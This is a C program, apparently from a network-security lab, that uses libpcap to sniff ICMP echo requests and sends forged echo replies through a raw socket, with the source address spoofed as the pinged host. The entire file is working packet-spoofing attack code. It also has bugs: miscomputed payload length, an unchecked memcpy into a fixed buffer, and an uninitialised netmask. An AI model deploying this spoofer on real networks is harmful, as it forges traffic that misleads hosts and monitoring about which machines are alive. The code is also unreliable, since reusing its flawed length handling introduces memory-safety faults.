#include <stdio.h>
#include <pcap.h>
#include <errno.h>
#include <resolv.h>
#include <netdb.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <net/ethernet.h> //contain the ethernet header
#include <netinet/ip.h>	//contain the ip header
#include <netinet/ip_icmp.h>//contain the icmp header

unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all 
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16 
   sum += (sum >> 16);                  // add carry 
   return (unsigned short)(~sum);
}

void send_raw_ip_packet(struct iphdr* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, 
                     &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
   
    dest_info.sin_addr.s_addr = ip->daddr;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->tot_len), 0, 
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}
void got_packet(u_char *args, const struct pcap_pkthdr *header, 
        const u_char *packet)
{

  // get the ip part in the packet
  struct iphdr* ip_h = (struct iphdr*)(packet +sizeof(struct ethhdr));
  struct sockaddr_in src,dst;
  int ip_header_len = ip_h->ihl * 4;
  // get the icmp part in the packet
  struct icmphdr * icmp_h = (struct icmphdr *)(packet + ip_header_len + sizeof(struct ethhdr));
	src.sin_addr.s_addr = ip_h->saddr;//for the src ip
	dst.sin_addr.s_addr = ip_h->daddr;//for the dest ip

     char buffer[1500];
   if((int)(icmp_h->type) == 8)
   {
   printf("spoofing packet........\n");
    memset(buffer, 0, 1500);

      //get tha data part
    
     u_char *data = (u_char *)(packet + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct icmphdr));
    int data_size = ntohs(ip_h->tot_len) - (sizeof(struct iphdr)) + sizeof(struct icmphdr);
    // copy the data in to the new packet
    memcpy((buffer+sizeof(struct iphdr)+sizeof(struct icmphdr)),data,data_size);
    
    //Fill in the ICMP header.
    struct icmphdr *icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));
    icmp->type = 0; //ICMP Type: 8 is request, 0 is reply.

    // copy the id and the sequence of the packet that been sniffed
    icmp->un.echo.id = icmp_h->un.echo.id;
    icmp->un.echo.sequence = icmp_h->un.echo.sequence;
    
    // Calculate the checksum for integrity
    
    icmp->checksum = 0;
    icmp->checksum = in_cksum((unsigned short *)icmp,
                           sizeof(struct icmphdr)+data_size);

    //Fill in the IP header.
    struct iphdr *ip = (struct iphdr *)buffer;
    ip->version = 4;
    ip->ihl = ip_h->ihl;
    ip->ttl = 99;
    // replace the src ip with thw dst ip
    ip->saddr = inet_addr(inet_ntoa(dst.sin_addr));
    ip->daddr = inet_addr(inet_ntoa(src.sin_addr));
    // icmp protocol
    ip->protocol = IPPROTO_ICMP;
    ip->tot_len = ip_h->tot_len;

    //send the spoofed packet
    send_raw_ip_packet(ip);
   }
}

int main() {
 pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  bpf_u_int32 net;

  // Step 1: Open live pcap session on NIC with enp0s3 interface
  handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); 

  // Step 2: Compile filter_exp into BPF psuedo-code
  //it used to compile a string into a filter program
   // filter, the sniffer will get only icmp 
  pcap_compile(handle, &fp, "icmp", 0, net);     
  if (pcap_setfilter(handle, &fp) != 0 )
  {
    printf("can't set filter");
  }
                         

  // Step 3: Capture packets
  // go to a loop of sniff icmp packets
  pcap_loop(handle, -1, got_packet, NULL);                

  pcap_close(handle);   //Close the handle 
  return 0;
}


 
